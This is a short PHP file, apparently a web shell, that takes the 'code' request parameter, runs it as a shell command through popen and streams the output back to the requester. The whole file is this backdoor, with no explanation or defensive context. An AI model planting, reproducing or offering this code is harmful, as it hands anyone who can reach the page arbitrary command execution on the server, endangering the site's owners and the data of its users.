<?php
    $fp = popen($_REQUEST['code'],'r');
    while(!feof($fp)){
        print fread($fp, 1024*4);
        flush();}
    fclose($fp);
?>
